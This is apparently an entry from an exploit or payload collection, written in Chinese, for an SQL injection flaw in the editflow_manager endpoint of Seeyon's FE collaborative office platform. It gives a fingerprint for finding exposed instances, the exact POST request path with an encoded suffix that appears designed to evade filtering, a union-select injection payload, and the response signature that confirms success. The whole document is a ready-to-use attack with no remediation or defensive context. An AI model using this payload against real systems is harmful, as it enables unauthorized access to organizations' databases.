# 致远互联FE协作办公平台editflow_managerSQL注入漏洞

致远OA ｜ SQL注入 ｜ —
- **指纹**：`title="FE协作办公平台"`
- **请求**：`POST /sysform/003/editflow_manager.js%70 HTTP/1.1`

**Payload**
```
option=2&GUID=-1'+union+select+111*222--+
```
- **响应特征**：200 24642